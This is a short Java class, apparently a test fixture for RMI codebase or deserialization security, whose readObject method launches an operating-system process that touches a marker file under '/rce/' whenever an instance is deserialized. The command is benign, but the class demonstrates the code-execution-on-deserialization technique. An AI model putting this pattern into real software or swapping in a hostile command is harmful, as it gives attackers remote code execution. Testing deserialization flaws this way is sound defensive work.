import java.io.Serializable;
import java.io.ObjectInputStream;
import java.rmi.server.RemoteObject;

public class CodebaseTest6 extends RemoteObject implements Serializable
{
    private static String cmd = "/bin/touch";
    private static final long serialVersionUID = 2L;

    private void readObject(ObjectInputStream aInputStream) throws ClassNotFoundException, Exception
    {
        String fileName = "/rce/" + getClass().getName() + ".txt";
        Process p = new ProcessBuilder(cmd, fileName).start();
        p.waitFor();
        p.destroy();
    }
}
